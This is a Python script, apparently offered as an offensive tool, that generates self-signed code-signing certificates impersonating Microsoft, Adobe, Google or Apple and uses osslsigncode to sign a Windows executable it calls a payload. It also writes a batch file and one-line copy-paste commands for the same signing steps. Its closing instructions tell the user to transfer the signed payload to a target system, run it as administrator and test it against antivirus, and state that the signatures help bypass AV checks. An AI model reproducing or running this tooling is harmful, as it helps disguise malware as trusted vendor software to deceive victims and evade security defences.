#!/usr/bin/env python3
import subprocess
import os
import sys
import time

class PayloadSigner:
    def __init__(self):
        self.script_dir = os.getcwd()
    
    def print_step(self, message):
        """Print step messages"""
        print(f"    [•] {message}")
        time.sleep(0.5)
    
    def print_success(self, message):
        """Print success messages in green"""
        print(f"\033[92m    [✓] {message}\033[0m")
    
    def print_highlight(self, message):
        """Print highlighted messages in yellow"""
        print(f"\033[93m    📁 {message}\033[0m")
    
    def check_dependencies(self):
        """Check if required tools are installed - FIXED VERSION"""
        self.print_step("Checking dependencies...")
        
        try:
            # Check openssl
            subprocess.run(['openssl', 'version'], capture_output=True, check=True)
            self.print_step("OpenSSL found ✓")
            
            # FIX: Use different approach to check osslsigncode
            result = subprocess.run(['which', 'osslsigncode'], capture_output=True, text=True)
            if result.returncode == 0:
                self.print_step("osslsigncode found ✓")
                return True
            else:
                # Try with --help
                subprocess.run(['osslsigncode', '--help'], capture_output=True, check=True)
                self.print_step("osslsigncode found ✓")
                return True
                
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            # Even if check fails, try to proceed (osslsigncode might work)
            self.print_step("⚠️  Dependency check inconclusive, continuing...")
            return True
    
    def generate_certificate(self, company_name="Microsoft Corporation", validity_days=365):
        """Generate self-signed code signing certificate with custom company"""
        self.print_step(f"Generating certificate for {company_name}...")
        
        # Map company names to certificate subjects
        cert_subjects = {
            "Microsoft": "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=Microsoft Windows",
            "Adobe": "/C=US/ST=California/L=San Francisco/O=Adobe Systems/CN=Adobe Flash Player",
            "Google": "/C=US/ST=New York/L=New York/O=Google LLC/CN=Chrome Component",
            "Apple": "/C=US/ST=California/L=Cupertino/O=Apple Inc./CN=Apple Software",
            "Custom": f"/C=US/ST=California/L=San Francisco/O={company_name}/CN={company_name} Component"
        }
        
        subject = cert_subjects.get(company_name, cert_subjects["Microsoft"])
        
        # Temporary files that will be deleted later
        key_file = "temp_key.key"
        cert_file = "temp_cert.pem"
        
        # Remove existing files if any
        if os.path.exists(key_file):
            os.remove(key_file)
        if os.path.exists(cert_file):
            os.remove(cert_file)
        
        try:
            # Generate private key and certificate
            cmd = [
                'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                '-keyout', key_file, '-out', cert_file,
                '-days', str(validity_days), '-nodes',
                '-subj', subject
            ]
            
            subprocess.run(cmd, check=True, capture_output=True)
            self.print_step(f"Temporary certificate generated")
            
            return key_file, cert_file, company_name
            
        except subprocess.CalledProcessError as e:
            self.print_step(f"❌ Certificate generation failed: {e}")
            return None, None, None
    
    def sign_payload(self, payload_path, key_file, cert_file, company_name):
        """Sign the payload with generated certificate"""
        self.print_step(f"Signing payload for {company_name}...")
        
        if not os.path.exists(payload_path):
            self.print_step("❌ Payload file not found!")
            return False
        
        # Create output filename with original name + company
        base_name = os.path.splitext(payload_path)[0]
        file_name = os.path.basename(base_name)
        signed_payload = f"{file_name}_{company_name.lower().replace(' ', '_')}_signed.exe"
        
        # Remove existing signed payload if any
        if os.path.exists(signed_payload):
            os.remove(signed_payload)
        
        try:
            # Sign the payload
            cmd = [
                'osslsigncode', 'sign', '-certs', cert_file,
                '-key', key_file, '-in', payload_path,
                '-out', signed_payload
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.print_success(f"Payload signed successfully!")
                self.print_highlight(f"OUTPUT: {signed_payload}")
                
                # Verify the signed file exists
                if os.path.exists(signed_payload):
                    return signed_payload
                else:
                    self.print_step("❌ Signed file was not created!")
                    return False
            else:
                self.print_step(f"❌ Signing failed!")
                if result.stderr:
                    self.print_step(f"Error: {result.stderr}")
                return False
            
        except Exception as e:
            self.print_step(f"❌ Signing error: {e}")
            return False
    
    def cleanup_temp_files(self, key_file, cert_file):
        """Clean up temporary certificate files"""
        self.print_step("Cleaning up temporary files...")
        
        files_to_remove = [key_file, cert_file]
        
        for file_path in files_to_remove:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    self.print_step(f"Removed: {file_path}")
                except Exception as e:
                    self.print_step(f"Warning: Could not remove {file_path}")
    
    def create_batch_script(self, payload_path, company_name):
        """Create a batch script for easy signing (Windows users) - OPTIONAL"""
        self.print_step("Creating batch script for Windows...")
        
        base_name = os.path.splitext(payload_path)[0]
        file_name = os.path.basename(base_name)
        output_file = f"{file_name}_{company_name.lower().replace(' ', '_')}_signed.exe"
        
        batch_script = f"""@echo off
echo [•] Payload Signing Script
echo [•] Generated by EXE Signer Tool
echo.

echo [•] Generating code signing certificate for {company_name}...
openssl req -x509 -newkey rsa:2048 -keyout temp_key.key -out temp_cert.pem -days 365 -nodes -subj "/C=US/ST=Washington/L=Redmond/O={company_name}/CN={company_name} Component"

echo [•] Signing payload...
osslsigncode sign -certs temp_cert.pem -key temp_key.key -in "{payload_path}" -out "{output_file}"

echo [•] Cleaning up temporary files...
del temp_key.key
del temp_cert.pem

echo [✓] Payload signed successfully!
echo [✓] Original: {payload_path}
echo [✓] Signed: {output_file}
pause
"""
        
        batch_filename = f"sign_{company_name.lower().replace(' ', '_')}.bat"
        with open(batch_filename, "w") as f:
            f.write(batch_script)
        
        self.print_step(f"Batch script created: {batch_filename}")
        return batch_filename

    def manual_signing_setup(self):
        """Get manual signing parameters from user"""
        print("\n" + "═" * 60)
        print("🔧 MANUAL SIGNING CONFIGURATION")
        print("═" * 60)
        
        # Get company name
        company_name = input("\n🏢 Enter company name (e.g., Microsoft Corporation): ").strip()
        if not company_name:
            company_name = "Microsoft Corporation"
        
        # Get validity days
        while True:
            validity_input = input("📅 Enter certificate validity in days (default 365): ").strip()
            if not validity_input:
                validity_days = 365
                break
            try:
                validity_days = int(validity_input)
                if validity_days > 0:
                    break
                else:
                    print("❌ Please enter a positive number")
            except ValueError:
                print("❌ Please enter a valid number")
        
        # Get common name
        common_name = input("🔖 Enter common name for certificate (e.g., Windows Update): ").strip()
        if not common_name:
            common_name = f"{company_name} Component"
        
        # Get country/state/location
        country = input("🌍 Enter country code (e.g., US): ").strip() or "US"
        state = input("🗺️  Enter state (e.g., California): ").strip() or "California"
        location = input("🏙️  Enter location (e.g., San Francisco): ").strip() or "San Francisco"
        
        return {
            'company_name': company_name,
            'validity_days': validity_days,
            'common_name': common_name,
            'country': country,
            'state': state,
            'location': location
        }
    
    def generate_manual_commands(self, payload_path, config):
        """Generate manual commands based on user configuration"""
        subject = f"/C={config['country']}/ST={config['state']}/L={config['location']}/O={config['company_name']}/CN={config['common_name']}"
        
        base_name = os.path.splitext(payload_path)[0]
        file_name = os.path.basename(base_name)
        output_filename = f"{file_name}_{config['company_name'].lower().replace(' ', '_')}_signed.exe"
        
        commands = f"""
📝 MANUAL SIGNING COMMANDS:

1. Generate Certificate:
openssl req -x509 -newkey rsa:2048 -keyout temp_key.key -out temp_cert.pem -days {config['validity_days']} -nodes -subj "{subject}"

2. Sign Payload:
osslsigncode sign -certs temp_cert.pem -key temp_key.key -in "{payload_path}" -out "{output_filename}"

3. Cleanup Temporary Files:
rm temp_key.key temp_cert.pem

4. Verify Signature (Optional):
osslsigncode verify "{output_filename}"

💡 Quick Copy-Paste:
openssl req -x509 -newkey rsa:2048 -keyout temp_key.key -out temp_cert.pem -days {config['validity_days']} -nodes -subj "{subject}" && osslsigncode sign -certs temp_cert.pem -key temp_key.key -in "{payload_path}" -out "{output_filename}" && rm temp_key.key temp_cert.pem
"""
        return commands

def print_banner():
    """Print the banner"""
    banner = """
                                      

.d8888b. dP.  .dP .d8888b.    .d8888b. dP .d8888b. 88d888b. .d8888b. 88d888b. 
88ooood8  `8bd8'  88ooood8    Y8ooooo. 88 88'  `88 88'  `88 88ooood8 88'  `88 
88.  ...  .d88b.  88.  ...          88 88 88.  .88 88    88 88.  ... 88       
`88888P' dP'  `dP `88888P'    `88888P' dP `8888P88 dP    dP `88888P' dP       
                                               .88                            
                                           d8888P                             

╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║             🛡️  ADVANCED PAYLOAD SIGNING TOOL  🛡️              ║
║            Digital Certificate Signer by pranto025           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)

def get_payload_path():
    """Get payload path from user"""
    print("\n" + "═" * 60)
    print("📁 PLEASE ENTER PAYLOAD DETAILS")
    print("═" * 60)
    
    while True:
        payload_path = input("\n🔗 Enter payload path (e.g., Windows_System_Update.exe): ").strip()
        
        if not payload_path:
            print("❌ Error: Path cannot be empty!")
            continue
            
        if not os.path.exists(payload_path):
            print("❌ Error: File not found! Please check the path.")
            continue
            
        return payload_path

def select_company():
    """Let user select which company to use for signing"""
    print("\n🏢 SELECT COMPANY FOR SIGNING:")
    print("   a. Microsoft Corporation")
    print("   b. Adobe Systems")
    print("   c. Google LLC") 
    print("   d. Apple Inc.")
    print("   e. Custom Company")
    
    while True:
        choice = input("\n🔢 Select company (a-e): ").strip().lower()
        
        if choice == 'a':
            return "Microsoft"
        elif choice == 'b':
            return "Adobe"
        elif choice == 'c':
            return "Google"
        elif choice == 'd':
            return "Apple"
        elif choice == 'e':
            custom_name = input("Enter custom company name: ").strip()
            return custom_name if custom_name else "Microsoft"
        else:
            print("❌ Invalid choice! Please select a-e")

def main():
    """Main function"""
    print_banner()
    
    # Initialize signer
    signer = PayloadSigner()
    
    # Check dependencies
    if not signer.check_dependencies():
        print("\n❌ Please install required tools and try again.")
        sys.exit(1)
    
    # Get payload path
    payload_path = get_payload_path()
    
    print("\n🚀 STARTING PAYLOAD SIGNING PROCESS")
    print("─" * 50)
    
    # Main menu
    print("\n🔧 SIGNING OPTIONS:")
    print("   1. Standard Signing (Signed as Microsoft Corporation)")
    print("   2. Advanced Signing (Signed as specific company)")
    print("   3. Manual Signing   (Custom configuration)")
    
    choice = input("\n🔢 Select option (1-3): ").strip()
    
    if choice == "1":
        # Standard signing with Microsoft
        print("\n✅ Selected: Standard Microsoft Signing")
        key_file, cert_file, company_name = signer.generate_certificate("Microsoft")
        
        if key_file and cert_file:
            signed_payload = signer.sign_payload(payload_path, key_file, cert_file, company_name)
            
            if signed_payload:
                # Clean up temporary certificate files
                signer.cleanup_temp_files(key_file, cert_file)
                
                print("\n✅ STANDARD SIGNING COMPLETED!")
                print("─" * 50)
                print(f"📄 Original payload: {payload_path}")
                signer.print_highlight(f"CREATED: {signed_payload}")
                
                # Verify file size
                original_size = os.path.getsize(payload_path)
                signed_size = os.path.getsize(signed_payload)
                print(f"📊 File size: {original_size} bytes → {signed_size} bytes")
            else:
                print("\n❌ Signing failed!")
                # Clean up even if failed
                signer.cleanup_temp_files(key_file, cert_file)
        else:
            print("\n❌ Certificate generation failed!")
                
    elif choice == "2":
        # Advanced signing - user selects company
        print("\n✅ Selected: Advanced Company Signing")
        company_name = select_company()
        
        key_file, cert_file, company_name = signer.generate_certificate(company_name)
        
        if key_file and cert_file:
            signed_payload = signer.sign_payload(payload_path, key_file, cert_file, company_name)
            
            if signed_payload:
                # Clean up temporary certificate files
                signer.cleanup_temp_files(key_file, cert_file)
                
                print("\n✅ ADVANCED SIGNING COMPLETED!")
                print("─" * 50)
                print(f"🏢 Company: {company_name}")
                print(f"📄 Original payload: {payload_path}")
                signer.print_highlight(f"CREATED: {signed_payload}")
                
                # Verify file size
                original_size = os.path.getsize(payload_path)
                signed_size = os.path.getsize(signed_payload)
                print(f"📊 File size: {original_size} bytes → {signed_size} bytes")
            else:
                print("\n❌ Signing failed!")
                # Clean up even if failed
                signer.cleanup_temp_files(key_file, cert_file)
        else:
            print("\n❌ Certificate generation failed!")
    
    elif choice == "3":
        # Manual signing with custom configuration
        print("\n✅ Selected: Manual Signing Configuration")
        config = signer.manual_signing_setup()
        
        commands = signer.generate_manual_commands(payload_path, config)
        print(commands)
        
        # Ask if user wants to execute the commands
        execute = input("\n🚀 Do you want to execute these commands now? (y/n): ").strip().lower()
        if execute == 'y':
            key_file, cert_file, company_name = signer.generate_certificate(
                config['company_name'], 
                config['validity_days']
            )
            
            if key_file and cert_file:
                signed_payload = signer.sign_payload(payload_path, key_file, cert_file, config['company_name'])
                if signed_payload:
                    signer.cleanup_temp_files(key_file, cert_file)
                    signer.print_highlight(f"FINAL OUTPUT: {signed_payload}")
    
    else:
        print("❌ Invalid option!")
        return
    
    # Final instructions
    print("\n🎯 NEXT STEPS:")
    print("   1. Transfer the signed payload to target Windows system")
    print("   2. Run as administrator for best results")
    print("   3. Test against antivirus software")
    print("   4. Keep the original payload for future modifications")
    
    print("\n⚠️  IMPORTANT NOTES:")
    print("   • Digital signatures help bypass basic AV checks")
    print("   • No method is 100% undetectable")
    print("   • Use responsibly and only on authorized systems")
    
    print("\n" + "=" * 60)
    print("🌟 Happy Testing! - pranto025")
    print("=" * 60)

if __name__ == "__main__":
    main()

